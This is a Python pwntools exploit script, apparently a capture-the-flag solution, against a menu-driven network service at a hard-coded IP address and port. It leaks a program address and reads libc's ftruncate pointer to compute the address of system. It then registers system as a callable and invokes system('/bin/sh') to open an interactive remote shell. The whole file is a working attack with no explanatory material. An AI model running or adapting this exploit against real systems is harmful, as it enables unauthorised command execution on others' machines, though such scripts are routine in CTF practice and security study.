import pwn

class Exploit:
    def __init__(self, addr, port, debug):
        if debug == True:
            pwn.context.log_level = 'DEBUG'
        self.handle = pwn.remote(addr, port)

    def recv_menu(self):
        self.handle.readuntil('>> ')

    def list_func(self, index):
        self.recv_menu()
        self.handle.writeline('1')
        self.handle.readuntil('[%d]' % index)
        addr = int(self.handle.readline().split()[1], 16)
        self.handle.readline()
        return addr

    def reg_func(self, name, func=0):
        self.recv_menu()
        self.handle.writeline('2')
        self.handle.writeline("%7s" % name + "%x" % func)
        self.handle.readline()

    def call_func(self, index, p1=0, p2=0, p3=0):
        self.recv_menu()
        self.handle.writeline('4')
        self.handle.readuntil(': ')
        self.handle.writeline('%d' % index)
        self.handle.readuntil(': ')
        self.handle.writeline('%d' % p1)
        self.handle.readuntil(': ')
        self.handle.writeline('%d' % p2)
        self.handle.readuntil(': ')
        self.handle.writeline('%x' % p3)

    # call printer
    def get_content(self, addr):
        self.call_func(1, p3=addr)
        return int(self.handle.readline().split()[3], 16)

    def exploit(self):
        # register printer
        self.reg_func('/bin/sh')

        # addr of printer
        printer = self.list_func(1)

        # printer + 0x2543 = &ftruncate
        pftruncate = printer + 0x2543

        # ftruncate - 0xa7520 = system
        system = self.get_content(pftruncate) - 0xa7520
        self.reg_func('system', system)

        # printer + 0x25db = db
        db = printer + 0x25db

        # *db = db[0].name = "/bin/sh"
        cmd = self.get_content(db)

        # system("/bin/sh")
        self.call_func(2, p1=cmd)

        self.handle.interactive()

e = Exploit("143.248.38.212", 40010, False)
e.exploit()
